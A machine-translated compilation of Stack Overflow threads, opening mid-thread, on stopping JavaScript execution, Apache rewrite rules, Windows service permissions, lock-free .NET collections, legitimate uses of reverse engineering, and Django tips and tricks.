 for(;;);
```

**例子**

```
console.log('READY!');

setTimeout(()=>{

  /* animation call */ 
  div.className = "anim";

  console.log('SET!');

  setTimeout(()=>{

    setTimeout(()=>{
      console.log('this code will never be executed');
    },1000);

    console.log('GO!');

    /* BOMB */
    for(;;);

    console.log('this code will never be executed');

  },1000);

},1000);
```

```
#div {
  position: fixed;
  height: 1rem; width: 1rem;
  left:   0rem; top:   0rem;
  transition: all 5s;
  background: red;
}
/* this <div> will never reached the right bottom corner */
#div.anim {
  left: calc(100vw - 1rem);
  top:  calc(100vh - 1rem);
}
```

```
<div id="div"></div>
```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2021-07-31T19:42:05.423

要停止脚本执行而不会出现任何错误，您可以将所有脚本包含到一个函数中并执行它。
这是一个例子：

```
(function () {
    console.log('one');
    return;
    console.log('two');
})();
```

上面的脚本只会记录**一个**.

**使用前**

*   如果您需要在脚本本身之外读取脚本的函数，请记住（通常）它不起作用：为此，您需要使用预先存在的变量或对象（您可以将函数放在*窗口*对象）。
*   上面的代码可能是您不想要的：将整个脚本放在一个函数中可能会产生其他后果（例如，这样做，脚本将立即运行，并且在开发过程中无法从浏览器修改其部分，据我所知，在 Chrome 中）

* * *

## 回答 #20

> 赞同：-1
> 
> 时间：2020-06-04T11:57:58.060

在大多数情况下不适用，但我在浏览器中运行了很多异步脚本，并且作为黑客我做

```
window.reload(); 
```

停止一切。

* * *

## 回答 #21

> 赞同：-2
> 
> 时间：2017-10-11T21:27:34.767

这是一个示例，如果存在条件，则终止脚本。我在我的 SSE 客户端 javascript 中使用它，如果

```
<script src="sse-clint.js" host="https://sse.host" query='["q1,"q2"]' ></script> 
```

无法从 JSON 解析中直接解析...

```
if( ! SSE_HOST  ) throw new Error(['[!] SSE.js: ERR_NOHOST - finished !']); 
```

...无论如何，一般的想法是：

```
if( error==true) throw new Error([ 'You have This error' ,  'At this file', 'At this line'  ]); 
```

这将终止/终止您的 javasript 脚本

* * *

## 回答 #22

> 赞同：-2
> 
> 时间：2018-12-25T05:10:51.100

只需创建一个 BOOL 条件，这里不需要复杂的代码..

如果即使您将其变为 true/ 或多次，它都会为您提供一条解决方案/而不是多个解决方案 - 基本上就这么简单。

* * *

## 回答 #23

> 赞同：-2
> 
> 时间：2019-10-22T07:54:48.973

我使用这段代码来停止执行：

```
throw new FatalError("!! Stop JS !!"); 
```

你会得到一个控制台错误，但它对我很有用。

* * *

## 回答 #24

> 赞同：-4
> 
> 时间：2019-09-04T05:48:48.967

我使用 return 语句而不是 throw，因为 throw 在控制台中给出错误。最好的方法是检查条件

```
if(condition){
 return //whatever you want to return
} 
```

这只是从该行停止程序的执行，而不是在控制台中给出任何错误。

# apache - 另一个 mod_rewrite 斜杠问题

> ID：550587
> 
> 赞同：2
> 
> 时间：2009-02-15T09:23:36.060
> 
> 标签：apache, mod-rewrite, sourceforge

我的`.htaccess`文件中有以下重写规则：

```
RewriteEngine on
RewriteRule ^news/([0-9]+)/?$ /?action=news&start=$1 [L]
RewriteRule ^man/([a-zA-Z0-9_]+)/?$ /?action=man&page=$1 [L]
RewriteRule ^([a-zA-Z0-9_]+)/?$ /?action=$1 [L] 
```

然后全部以 a 结束，`/?`以检查可选的尾部斜杠。这行得通——这意味着我可以使用`http://www.site.com/news/`或`http://www.site.com/news`访问`news`页面，这就是我想要的。问题是，虽然`http://www.site.com/news/`工作正常并且静默重定向以及所有有趣的东西，但由于某种原因`http://www.site.com/news`被明显重定向到。`http://www.site.com/news/?action=news`他们都提出了同一个站点，但由于某种原因，如果我去掉尾部斜杠，URL 会发生变化并且看起来很讨厌。

有什么想法吗？我的`.hyaccess`文件中没有其他规则。我还会指出这一点，`http://www.site.com/news/0`并且`http://www.site.com/news/0/`不会遇到同样的问题。他们俩都隐形重定向到`http://www.site.com/?action=news&start=0`，这就是我想要的。这似乎只是第三条规则的问题。

如果有帮助，该站点位于 SourceForge.net 上。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-15T09:36:50.367

一个疯狂的猜测：有一个名为“news”的目录，自动 Apache 目录“添加尾部斜杠”重定向正在启动并以一种奇怪的方式与您的 RewriteRule 交互。如果是这样的话，

```
DirectorySlash Off 
```

可能会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T09:34:43.163

也许[`MultiViews`](http://httpd.apache.org/docs/2.2/mod/core.html#options)是导致这种行为。尝试禁用此选项：

```
Options -MultiViews 
```

* * *

另一个猜测：删除替换中的前导斜杠。

# language-agnostic - 桌面开发人员成为 Web 开发人员的合适材料是什么？

> ID：550611
> 
> 赞同：1
> 
> 时间：2009-02-15T09:49:09.603
> 
> 标签：language-agnostic

我是一个 .NET 家伙桌面开发人员，我喜欢这一点。我真的不喜欢 Web 开发，因为我们浪费了宝贵的时间来调试 CSS、javascript 和兼容性的东西，而不是创造价值。

但我认为这是因为我没有花时间学习好的 Web 开发实践，所以现在因为我想成为我能做到的最好的开发人员，我想了解我的弱点。

你能给我一些建议/链接/模式/框架来成为一名优秀的 Web 开发人员吗？（我是一个 .NET 人，所以我接受所有可以让我在 .NET 中开发更好网站的东西）。

谢谢 ！

***精确***

我过去做过很多 ASP.NET 网络表单，但这还不足以在不浪费时间处理兼容性/css/javascript 问题的情况下创建出色的网站。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T09:52:32.870

您可以走捷径并使用 ASP.NET，它提供了许多控件以使 Web 开发更容易 - 您会熟悉使用它们。

不幸的是，它们并不是那么好（imo），也没有教你使用网络的良好实践。

我建议您研究一下现在处于测试阶段的[ASP MVC 。](http://www.asp.net/mvc/)这将教您如何编写网站，同时允许您使用熟悉 .NET 的库

对于一般的 Web 开发，请查看[W3schools](http://www.w3schools.com/)之类的网站，它会教您基础知识。

请记住使用 CSS 将表示与标记分开，并确保您使用 javascript 为页面添加价值，但请确保您的页面在没有它的情况下仍然可用。

你总是会在 CSS 兼容性问题上浪费时间，我只能说通过练习你会知道要避免哪些陷阱，这样它会变得更容易一些。

至于 javascript 开发，在过去的几年里，它有了很大的改进，框架在理论上是跨浏览器的。也许尝试研究与 ASP MVC 同步良好并在 Visual Studio 中具有智能感知功能的[JQuery](http://jquery.com/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T10:15:33.487

建议：

我能给你的最好建议：当你做正确的事情时不要生气，但它不会如你所愿。耐心！:)

链接：

[www.w3schools.com](http://www..w3schools.com/)

[Nettuts.com](http://nettuts.com/)

[Webappers.com](http://www.webappers.com/)

[数码点 - 站长论坛](http://forums.digitalpoint.com/)

图案：

我的建议是更多地了解 MVC 模式和任何企业模式。

构架：

只需查看此链接 :)[框架指南](http://net.tutsplus.com/articles/web-roundups/tools-of-the-trade-web-development-frameworks-that-the-pros-use/)

对于 Javascript：[JQuery](http://jquery.com/)、[Prototype](http://www.prototypejs.org/)、[Mootools](http://mootools.net/)、[EXTJs](http://extjs.com/)

对于 CSS：[960 网格系统](http://960.gs/)还不错

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T09:57:57.413

确保您也了解客户端/浏览器端。

当前所有不同浏览器的最佳实践是使用 javascript 库来使您的 Web 应用程序跨平台和跨浏览器。[一个像jQuery](http://www.jquery.com)或[Prototype](http://www.prototypejs.org/)这样的 AJAX 库，用于执行在前 AJAX 时代您无法使用标准 HTML 和 CSS 执行的交互操作。

# c# - 如何在远程计算机上授予 Window 服务访问权限？

> ID：550613
> 
> 赞同：1
> 
> 时间：2009-02-15T09:51:17.837
> 
> 标签：c#, windows-services

我正在开发一项 Windows 服务，其任务之一是在远程机器上归档文件，但我对访问权限“访问 id 被拒绝”有疑问。

服务帐户是“LocalService”，

如何授予对远程机器的服务访问权限？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T09:54:23.460

LocalService 不能在另一台机器上拥有权限，因此您需要将服务帐户更改为其他帐户，并确保该帐户在远程机器上具有必要的权限。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T09:59:27.940

您需要在两台机器都识别的专用帐户（例如域帐户）中运行该服务。然后授予此帐户访问第二台计算机所需的 ACL 权限。

如果您不在域中，则可以使用相同的用户名和密码来做一些事情......

另一种方法是使用“网络服务”帐户 - 这将使用托管服务的机器的身份进行身份验证；它可以工作，但我个人喜欢专用帐户方法 - 它更容易实现精细的安全性，并且意味着您可以毫不费力地将服务重新定位到另一台主机。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T09:58:07.617

server1 上在本地服务主体下运行并尝试访问 server2 上的文件夹的服务被视为匿名连接尝试，取决于 server2 的策略是否允许。因此，您需要在 server2 上允许匿名访问或更改服务帐户（推荐）。

# .net - 在 C# 中锁定空闲堆栈和队列

> ID：550616
> 
> 赞同：31
> 
> 时间：2009-02-15T09:53:40.403
> 
> 标签：.net, multithreading, data-structures, synchronization, lock-free

有谁知道是否有任何可用于 .NET 的无锁容器库？

最好是被证明比我们在 .NET 中的同步包装器更有效且更快的东西。

我在 .NET 上找到了一些文章，但没有一篇指定任何速度基准测试，也没有激发人们对其可靠性的信心。

谢谢

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-02-25T21:31:04.763

迟到了，但总比没有好，我认为我会将 Julian Bucknalls 的文章添加到此列表中。

但他没有业绩数据。在我对他的结构的测试中，与锁定相比，该列表的扩展性很好（与 ReaderWriterLock 相比，内核使用率非常低）。

他的博客有一系列关于 C# 中无锁结构的文章。

[无锁数据结构：堆栈](http://www.boyet.com/Articles/LockfreeStack.html)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2009-02-15T10:04:29.503

你的意思是像它们存在于 PFX 框架（Parallels for .NET）、ConcurrentQueue 和 ConcurrentStack 中的容器类吗？

[Pfx 博客](http://blogs.msdn.com/pfxteam/archive/2008/08/12/8852005.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-10-09T03:10:30.550

在对此一无所知的情况下，我在[这里](http://code.msdn.microsoft.com/RantPack)偶然发现了一个图书馆。

虽然可能不是您正在寻找的东西，但至少在这里有一个关于[C# 中无锁队列结构的](https://stackoverflow.com/questions/1541510/is-this-lock-free-net-queue-thread-safe)StackOverflow 的实现和讨论。通过 StackOverflow 代码审查过程可能会对其安全性产生一些信心，或者提供有关如何自己构建无锁容器的信息。

* * *

## 回答 #4

> 赞同：-5
> 
> 时间：2009-03-16T23:35:45.007

无锁数据结构会出现问题，直到它们使用由内存模型引起的混乱来修改 CLR，请参阅 CLI 规范。

无锁编程非常困难，您不应该在集合（容器）级别上打扰它。对任何语言都适用..

# reverse-engineering - 逆向工程在哪里使用？

> ID：550627
> 
> 赞同：19
> 
> 时间：2009-02-15T10:02:38.823
> 
> 标签：reverse-engineering

我问自己**在哪里**使用逆向工程。我有兴趣学习它。但我不知道我是否可以/应该把它放在我的简历上。

我不希望我的新上司认为我是一个邪恶的黑客之类的。:)

*   那么值得吗？
*   我应该学习它还是将精力放在其他地方？
*   有没有好的书或教程？:)

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-02-15T10:50:18.600

逆向工程通常用于**破译文件格式**以提高互操作性。例如，许多流行的商业 Windows 应用程序不能在 Linux 上运行，这需要对这些应用程序生成的文件进行逆向工程，以便它们可以在 Linux 中使用。Gimp、OpenOffice、Inkscape 等支持的各种格式就是一个很好的例子。

逆向工程的另一个常见用途是**解密协议**。很好的例子包括[Samba](http://www.samba.org/)、许多非 iTunes 应用程序中的[DAAP支持、跨平台 IM 客户端（如](http://en.wikipedia.org/wiki/Digital_Audio_Access_Protocol)[Pidgin](http://www.pidgin.im/)）等。对于协议逆向工程，常用的行业工具包括[Wireshark](http://www.wireshark.org/)和[libpcap](http://www.tcpdump.org/)。

毫无疑问，逆向工程通常与软件破解有关，这主要是理解程序反汇编。我不能说我曾经*需要*反汇编一个程序，而不是出于纯粹的好奇或让它做一些它没有做的事情。逆向工程程序的一个优点是要理解它，您需要学习汇编编程。然而，有一些合法的方法可以磨练你的反汇编技巧，特别是使用[Crackmes](http://en.wikipedia.org/wiki/Crackme)。需要说明的重要一点是，当您在应用程序中开发安全措施时，或者如果您从事该业务，您**需要**了解逆向工程师如何操作以试图保持领先一步。

恕我直言，逆向工程是一项非常强大且有用的技能。更不用说，它通常很有趣且令人上瘾。就像提到的 hmemcpy 一样，我不确定我是否会在我的简历中使用“逆向工程”一词，只使用与之相关的技能/知识。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-15T10:07:46.220

在我看来，逆向工程技能可能有用的领域之一是反病毒行业。但是，我不会将“逆向工程”放在我的简历上，而是写下汇编语言的经验，使用各种反汇编器/调试器（例如 IDA、SoftIce 或 OllyDbg）和其他相关技能。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-02-15T10:10:21.690

逆向工程通常是您必须做的事情，而不是因为您想这样做。例如，简单地对产品进行逆向工程就存在法律问题！但也有必要的情况——（例如）供应商已经离开并且不再存在或无法联系到。一个很好的例子是您输入问题的 WMD 编辑器。SO 团队/社区[必须从混淆的源代码对此进行逆向工程，](https://blog.stackoverflow.com/2009/01/updated-wmd-editor/)以应用一些错误修复。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-02-15T12:26:07.323

我从事过逆向工程项目，它们当然与黑客无关。我们拥有所有此类项目的源代码（合法），但对于其中一个项目，实际上没有人知道代码在幕后做了什么，以及它如何与其他系统交互。这些信息早已丢失。在另一个项目中，我们有源代码和一些文档，但文档不是最新的，因此我们必须对源进行逆向工程以更新文档。

我不介意在我的简历上有这样的项目。事实上，我相信我在这个过程中学到了很多东西。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-02-15T10:11:10.423

每当文档丢失或不存在时，都需要进行逆向工程。拥有源代码会有所帮助，但您仍然必须对原始逻辑、流程控制和错误进行逆向工程。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-15T10:53:27.810

使用奇怪的硬件通常会迫使您进行逆向工程。例如，我曾经使用过一个行为异常的旧信号采集卡；输入漂亮的正弦波会产生严重瘫痪的数据。事实证明，每隔一个字节都是二进制补码，每个其他字节都是补码——或者至少，当这样解释时，数据变得非常漂亮。当然，这在任何地方都没有记录，并且该卡在与自己的专有软件一起使用时可以完美运行。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-15T12:48:01.093

（根据我的经验）遇到有缺陷的旧代码是很常见的，或者由于需求的变化而变得过时，或者两者兼而有之。通常情况下，文档不足，并且原始开发人员不再可用。对代码进行逆向工程以了解其工作原理（有时做出修复或更换决定）是一项重要技能。

如果你有源头，做一个小的、精心计划的、严格范围的清理通常是合理的。（我大声暗示，不能让这成为宝贵的开发人员时间的天坑！）

能够在测试平台中练习代码也非常有帮助，既可以验证它是否符合预期，也可以识别、记录、隔离和修复缺陷。

安全地这样做需要仔细的工作。我强烈推荐 Michael Feathers 的《[*使用遗留代码*](https://rads.stackoverflow.com/amzn/click/com/0131177052)》一书，因为它在测试此类代码方面提供了实用指导。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-15T13:16:48.793

RCE 对安全人员（研究、开发、IDS、IPS、AV 等）来说是一项很棒的技能，但它也证明了您对该主题有深入而低层次的理解。

在使用 3rd 方库时也可以更轻松地找到自己的方式。

如果你不是从事安全行业的，如果你不擅长 ASM 就不要费心去学习它，一般来说它很难学。

**图书**

[黑客利用艺术](http://www.amazon.co.uk/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441/ref=sr_1_8?ie=UTF8&s=books&qid=1234703912&sr=8-8)从安全的角度讨论了这个主题。

此外，您可能还想阅读有关 Ollydbg 和 IDA Pro 的书籍

# cocoa - NSString 转换为 NSData

> ID：550629
> 
> 赞同：0
> 
> 时间：2009-02-15T10:02:52.020
> 
> 标签：cocoa, nsstring, nsdata

我想要一个`NSString`对象作为`NSData`. 稍后这个 NSData-Object 应该返回他的 stringValue：

```
NSData *data;
NSString *string = [[NSString alloc] initWithData:data 
                                         encoding:NSUTF8StringEncoding]; 
```

`string`不应该是零... =D

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T10:21:19.543

`dataUsingEncoding:`

# python - 最喜欢的 Django 提示和功能？

> ID：550632
> 
> 赞同：308
> 
> 时间：2009-02-15T10:06:22.730
> 
> 标签：python, django, hidden-features

受问题系列“...的隐藏功能”的启发，我很想知道您最喜欢的 Django 技巧或您知道的鲜为人知但有用的功能。

*   请每个答案只包含一个提示。
*   如果有，请添加 Django 版本要求。

* * *

## 回答 #1

> 赞同：221
> 
> 时间：2009-02-15T10:15:52.253

我只是从我自己的小费开始:)

**在 settings.py 中使用 os.path.dirname() 来避免硬编码的目录名。**

如果你想在不同的位置运行你的项目，不要在你的 settings.py 中硬编码路径。如果您的模板和静态文件位于 Django 项目目录中，请在 settings.py 中使用以下代码：

```
# settings.py
import os
PROJECT_DIR = os.path.dirname(__file__)
...
STATIC_DOC_ROOT = os.path.join(PROJECT_DIR, "static")
...
TEMPLATE_DIRS = (
    os.path.join(PROJECT_DIR, "templates"),
) 
```

致谢：我从截屏视频“ [Django From the Ground Up](http://thisweekindjango.com/screencasts/episode/10/django-ground-episodes-1-and-2/) ”中得到了这个提示。

* * *

## 回答 #2

> 赞同：128
> 
> 时间：2009-02-15T21:18:14.393

安装[Django 命令扩展](http://code.google.com/p/django-command-extensions)和[pygraphviz](http://networkx.lanl.gov/pygraphviz/)，然后发出以下命令以获得非常漂亮的 Django 模型可视化：

```
./manage.py graph_models -a -g -o my_project.png 
```

* * *

## 回答 #3

> 赞同：119
> 
> 时间：2009-02-15T16:06:32.147

使用[django-annoying 的](http://bitbucket.org/offline/django-annoying/wiki/Home) `render_to`装饰器而不是`render_to_response`.

```
@render_to('template.html')
def foo(request):
    bars = Bar.objects.all()
    if request.user.is_authenticated():
        return HttpResponseRedirect("/some/url/")
    else:
        return {'bars': bars}

# equals to
def foo(request):
    bars = Bar.objects.all()
    if request.user.is_authenticated():
        return HttpResponseRedirect("/some/url/")
    else:
        return render_to_response('template.html',
                              {'bars': bars},
                              context_instance=RequestContext(request)) 
```

编辑指出返回 HttpResponse（例如重定向）将使装饰器短路并按预期工作。

* * *

## 回答 #4

> 赞同：101
> 
> 时间：2009-06-03T18:34:02.873

There's a set of custom tags I use all over my site's templates. Looking for a way to autoload it (DRY, remember?), I found the following:

```
from django import template
template.add_to_builtins('project.app.templatetags.custom_tag_module') 
```

If you put this in a module that's loaded by default (your main urlconf for instance), you'll have the tags and filters from your custom tag module available in any template, without using `{% load custom_tag_module %}`.

The argument passed to `template.add_to_builtins()` can be any module path; your custom tag module doesn't have to live in a specific application. For example, it can also be a module in your project's root directory (eg. `'project.custom_tag_module'`).

* * *

## 回答 #5

> 赞同：96
> 
> 时间：2009-06-03T18:44:29.090

[Virtualenv](http://pypi.python.org/pypi/virtualenv#what-it-does) + Python = life saver if you are working on multiple Django projects and there is a possibility that they all don't depend on the same version of Django/an application.

* * *

## 回答 #6

> 赞同：87
> 
> 时间：2009-02-17T19:34:58.947

不要对您的 URL 进行硬编码！

改用[url 名称](http://docs.djangoproject.com/en/dev/topics/http/urls/#id2)，以及[`reverse`](http://docs.djangoproject.com/en/dev/topics/http/urls/#reverse)获取 URL 本身的函数。

定义 URL 映射时，为 URL 命名。

```
urlpatterns += ('project.application.views'
   url( r'^something/$', 'view_function', name="url-name" ),
   ....
) 
```

确保每个 URL 的名称都是唯一的。

我通常有一个一致的格式“project-appplication-view”，例如“cbx-forum-thread”用于线程视图。

**更新**（无耻地窃取[ayaz的补充](https://stackoverflow.com/questions/550632/favorite-django-tips-features/560111#560111)）：

此名称可以在带有[`url`标签](http://docs.djangoproject.com/en/dev/ref/templates/builtins/#url)的模板中使用。

* * *

## 回答 #7

> 赞同：81
> 
> 时间：2009-06-03T18:53:46.310

使用[django 调试工具栏](http://github.com/robhudson/django-debug-toolbar/)。例如，它允许查看在呈现视图时执行的所有 SQL 查询，您还可以查看其中任何一个的堆栈跟踪。

* * *

## 回答 #8

> 赞同：79
> 
> 时间：2009-02-18T05:37:30.040

不要编写自己的登录页面。如果您使用的是 django.contrib.auth。

真正肮脏的秘密是，如果您还使用 django.contrib.admin，并且 django.template.loaders.app_directories.load_template_source 在您的模板加载器中， **您也可以免费获得模板！**

```
# somewhere in urls.py
urlpatterns += patterns('django.contrib.auth',
    (r'^accounts/login/$','views.login', {'template_name': 'admin/login.html'}),
    (r'^accounts/logout/$','views.logout'),
) 
```

* * *

## 回答 #9

> 赞同：66
> 
> 时间：2009-08-19T13:53:50.083

## 上下文处理器很棒。

假设您有一个不同的用户模型，并且您希望在每个响应中都包含它。而不是这样做：

```
def myview(request, arg, arg2=None, template='my/template.html'):
    ''' My view... '''
    response = dict()
    myuser = MyUser.objects.get(user=request.user)
    response['my_user'] = myuser
    ...
    return render_to_response(template,
                              response,
                              context_instance=RequestContext(request)) 
```

上下文过程使您能够将任何变量传递给您的模板。我通常把我的放在`'my_project/apps/core/context.py`：

```
def my_context(request):
    try:
        return dict(my_user=MyUser.objects.get(user=request.user))
    except ObjectNotFound:
        return dict(my_user='') 
```

在您`settings.py`将以下行添加到您的`TEMPLATE_CONTEXT_PROCESSORS`

```
TEMPLATE_CONTEXT_PROCESSORS = (
    'my_project.apps.core.context.my_context',
    ...
) 
```

现在每次发出请求时，它都会`my_user`自动包含密钥。

## 也[表示](http://docs.djangoproject.com/en/dev/topics/signals/ "Django 信号")获胜。

几个月前我写了一篇关于这个的博客文章，所以我只是要剪切和粘贴：

开箱即用的 Django 为您提供了几个非常有用的信号。您可以在保存、初始化、删除之前和之后执行操作，甚至可以在处理请求时进行操作。因此，让我们摆脱这些概念并演示如何使用它们。假设我们有一个博客

```
from django.utils.translation import ugettext_lazy as _
class Post(models.Model):
    title = models.CharField(_('title'), max_length=255)
    body = models.TextField(_('body'))
    created = models.DateTimeField(auto_now_add=True) 
```

因此，您想以某种方式通知我们发布新帖子的众多博客 ping 服务之一，重建最近的帖子缓存，并发布关于它的推文。有了信号，您就可以完成所有这些操作，而无需向 Post 类添加任何方法。

```
import twitter

from django.core.cache import cache
from django.db.models.signals import post_save
from django.conf import settings

def posted_blog(sender, created=None, instance=None, **kwargs):
    ''' Listens for a blog post to save and alerts some services. '''
    if (created and instance is not None):
        tweet = 'New blog post! %s' instance.title
        t = twitter.PostUpdate(settings.TWITTER_USER,
                               settings.TWITTER_PASSWD,
                               tweet)
        cache.set(instance.cache_key, instance, 60*5)
       # send pingbacks
       # ...
       # whatever else
    else:
        cache.delete(instance.cache_key)
post_save.connect(posted_blog, sender=Post) 
```

我们开始了，通过定义该函数并使用 post_init 信号将该函数连接到 Post 模型并在保存后执行它。

* * *

## 回答 #10

> 赞同：58
> 
> 时间：2009-02-18T21:54:03.000

刚开始的时候不知道有[Paginator](http://docs.djangoproject.com/en/dev/topics/pagination/#topics-pagination)，请确保你知道它的存在！！

* * *

## 回答 #11

> 赞同：46
> 
> 时间：2009-12-03T03:55:57.227

使用[IPython](http://ipython.scipy.org/moin/)在任何级别跳转到您的代码并使用 IPython 的强大功能进行调试。安装 IPython 后，只需将此代码放在要调试的任何位置：

```
from IPython.Shell import IPShellEmbed; IPShellEmbed()() 
```

然后，刷新页面，转到您的 runserver 窗口，您将进入一个交互式 IPython 窗口。

我在 TextMate 中设置了一个片段，所以我只需输入 ipshell 并点击选项卡。没有它我活不下去。

* * *

## 回答 #12

> 赞同：43
> 
> 时间：2010-02-14T06:26:28.653

运行一个开发 SMTP 服务器，它只会输出发送给它的任何内容（如果您不想在开发服务器上实际安装 SMTP。）

命令行：

```
python -m smtpd -n -c DebuggingServer localhost:1025 
```

* * *

## 回答 #13

> 赞同：41
> 
> 时间：2009-07-01T04:27:35.343

从[django-admin 文档](http://docs.djangoproject.com/en/dev/ref/django-admin/)：

如果您使用 Bash shell，请考虑安装 Django bash 完成脚本，该脚本`extras/django_bash_completion`位于 Django 发行版中。`django-admin.py`它支持和命令的制表符补全`manage.py`，例如，您可以...

*   键入`django-admin.py`。
*   按 [TAB] 查看所有可用选项。
*   键入`sql`，然后键入 [TAB] 以查看名称以 开头的所有可用选项`sql`。

* * *

## 回答 #14

> 赞同：40
> 
> 时间：2011-02-01T10:11:58.553

[django_extensions](http://code.google.com/p/django-command-extensions/)`./manage.py runserver_plus`附带的功能真的很棒。

它创建了一个增强的调试页面，除其他外，使用 Werkzeug 调试器为堆栈中的每个点创建交互式调试控制台（见屏幕截图）。它还提供了一种非常有用的便捷调试方法`dump()`，用于显示有关对象/框架的信息。

![在此处输入图像描述](https://i.stack.imgur.com/M6dJb.jpg)

要安装，您可以使用 pip：

```
pip install django_extensions
pip install Werkzeug 
```

然后添加`'django_extensions'`到您的`INSTALLED_APPS`元组中`settings.py`并使用新扩展启动开发服务器：

```
./manage.py runserver_plus 
```

这将改变您的调试方式。

* * *

## 回答 #15

> 赞同：37
> 
> 时间：2009-02-15T16:20:26.887

我喜欢使用 Python 调试器 pdb 来调试 Django 项目。

这是学习如何使用它的有用链接：[http ://www.ferg.org/papers/debugging_in_python.html](http://www.ferg.org/papers/debugging_in_python.html)

* * *

## 回答 #16

> 赞同：37
> 
> 时间：2009-04-02T10:30:16.567

When trying to exchange data between Django and another application, `request.raw_post_data` is a good friend. Use it to receive and custom-process, say, XML data.

Documentation: [http://docs.djangoproject.com/en/dev/ref/request-response/](http://docs.djangoproject.com/en/dev/ref/request-response/)

* * *

## 回答 #17

> 赞同：36
> 
> 时间：2009-02-15T16:30:50.497

将[Jinja2](http://jinja.pocoo.org/2/)与 Django 一起使用。

如果您发现 Django 模板语言非常受限制（像我一样！），那么您不必拘泥于它。Django 很灵活，模板语言与系统的其余部分松散耦合，因此只需插入另一种模板语言并使用它来呈现您的 http 响应！

我使用[Jinja2](http://jinja.pocoo.org/2/)，它几乎就像 django 模板语言的增强版，它使用相同的语法，并允许您在 if 语句中使用表达式！不再制作自定义 if 标记，例如`if_item_in_list`! 你可以简单地说`%{ if item in list %}`，或`{% if object.field < 10 %}`。

但这还不是全部；它有更多的功能来简化模板的创建，我在这里不能一一列举。

* * *

## 回答 #18

> 赞同：35
> 
> 时间：2009-02-15T20:06:58.853

添加`assert False`您的视图代码以转储调试信息。

* * *

## 回答 #19

> 赞同：34
> 
> 时间：2009-02-18T07:07:30.167

这增加了上面关于[Django URL 名称和反向 URL 调度](https://stackoverflow.com/questions/550632/favorite-django-tips-features/558401#558401)的回复。

URL 名称也可以在模板中有效地使用。例如，对于给定的 URL 模式：

```
url(r'(?P<project_id>\d+)/team/$', 'project_team', name='project_team') 
```

您可以在模板中包含以下内容：

```
<a href="{% url project_team project.id %}">Team</a> 
```

* * *

## 回答 #20

> 赞同：27
> 
> 时间：2009-08-31T20:12:58.937

由于 Django“视图”只需要是返回 HttpResponse 的可调用对象，因此您可以轻松地创建基于类的视图，例如 Ruby on Rails 和其他框架中的视图。

有几种方法可以创建基于类的视图，这是我最喜欢的：

```
from django import http

class RestView(object):
    methods = ('GET', 'HEAD')

    @classmethod
    def dispatch(cls, request, *args, **kwargs):
        resource = cls()
        if request.method.lower() not in (method.lower() for method in resource.methods):
            return http.HttpResponseNotAllowed(resource.methods)
        try:
            method = getattr(resource, request.method.lower())
        except AttributeError:
            raise Exception("View method `%s` does not exist." % request.method.lower())
        if not callable(method):
            raise Exception("View method `%s` is not callable." % request.method.lower())
        return method(request, *args, **kwargs)

    def get(self, request, *args, **kwargs):
        return http.HttpResponse()

    def head(self, request, *args, **kwargs):
        response = self.get(request, *args, **kwargs)
        response.content = ''
        return response 
```

您可以在基本视图中添加各种其他内容，例如条件请求处理和授权。

设置好视图后，您的 urls.py 将如下所示：

```
from django.conf.urls.defaults import *
from views import MyRestView

urlpatterns = patterns('',
    (r'^restview/', MyRestView.dispatch),
) 
```

* * *

## 回答 #21

> 赞同：21
> 
> 时间：2009-11-14T22:15:03.283

而不是使用`render_to_response`将您的上下文绑定到模板并呈现它（这是 Django 文档通常显示的），而是使用通用视图[`direct_to_template`](http://docs.djangoproject.com/en/dev/ref/generic-views/#django-views-generic-simple-direct-to-template)。它做同样的事情，`render_to_response`但它也自动将 RequestContext 添加到模板上下文中，隐式允许使用上下文处理器。您可以使用 手动执行此操作`render_to_response`，但为什么要麻烦呢？这只是要记住的另一个步骤和另一个 LOC。除了使用上下文处理器之外，在模板中包含 RequestContext 还允许您执行以下操作：

```
<a href="{{MEDIA_URL}}images/frog.jpg">A frog</a> 
```

这是非常有用的。事实上，一般情况下，对一般视图 +1。Django 文档大多将它们显示为快捷方式，甚至没有简单应用程序的 views.py 文件，但您也可以在自己的视图函数中使用它们：

```
from django.views.generic import simple

def article_detail(request, slug=None):
    article = get_object_or_404(Article, slug=slug)
    return simple.direct_to_template(request, 
        template="articles/article_detail.html",
        extra_context={'article': article}
    ) 
```

* * *

## 回答 #22

> 赞同：20
> 
> 时间：2009-06-19T16:35:18.667

我没有足够的声誉来回复有问题的评论，但重要的是要注意，如果您要使用[Jinja](http://en.wikipedia.org/wiki/Jinja_(template_engine))，它不支持模板块名称中的“-”字符，而 Django 支持。这给我带来了很多问题，并浪费了时间试图追踪它生成的非常模糊的错误消息。

* * *

## 回答 #23

> 赞同：19
> 
> 时间：2010-01-19T12:57:39.047

每个人都知道有一个可以使用“manage.py runserver”运行的开发服务器，但是你知道还有一个用于提供静态文件（CSS / JS / IMG）的开发视图吗？

新手总是很困惑，因为 Django 并没有提供任何方法来提供静态文件。这是因为开发团队认为这是一个真实的 Web 服务器的工作。

但是在开发的时候，你可能不想设置Apache + mod_wisgi，它很重。然后您可以将以下内容添加到 urls.py：

```
(r'^site_media/(?P<path>.*)$', 'django.views.static.serve',
        {'document_root': '/path/to/media'}), 
```

